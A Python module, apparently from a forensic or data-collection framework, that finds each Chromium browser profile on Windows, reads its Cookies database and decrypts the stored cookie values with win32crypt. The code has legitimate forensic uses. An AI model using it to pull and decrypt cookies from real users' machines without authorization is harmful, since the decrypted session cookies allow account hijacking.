# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chromium.chromium_module import ChromiumModule
from api.windows import format
from internal import data_type


class WindowsChromiumCookie(ChromiumModule):
	def __init__(self):
		ChromiumModule.__init__(
			self,
			name='WindowsChromiumCookie',
			version='0.1.2',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():

			self.cursor_getV2(
				path=profile + '/Cookies',
				items=[
					[data_type.Link, 'host_key'],
					[data_type.Text, 'name'],
					[data_type.Text, 'encrypted_value', format.win32decrypt],
				],
				header=['url', 'name', 'value'],
				db='cookies',
				spe=os.path.split(profile)[1],
			)

		return True
